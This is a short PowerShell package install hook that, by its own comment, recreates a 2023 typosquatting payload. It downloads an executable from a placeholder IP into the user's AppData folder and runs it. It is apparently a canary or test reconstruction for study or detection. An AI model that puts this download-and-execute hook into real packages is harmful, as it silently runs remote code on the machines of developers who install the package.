param($installPath, $toolsPath, $package, $project)
# Shape of the March 2023 typosquat payload (JFrog): download a "2nd stage" to %APPDATA%, then run it.
$ProcName = "canary.exe"
$wc = [System.Net.WebClient]::new()
$wc.DownloadFile("http://198.51.100.7/$ProcName", "$env:APPDATA\$ProcName")
$wc.Dispose()
Clear-Host
Start-Process ("$env:APPDATA\$ProcName")
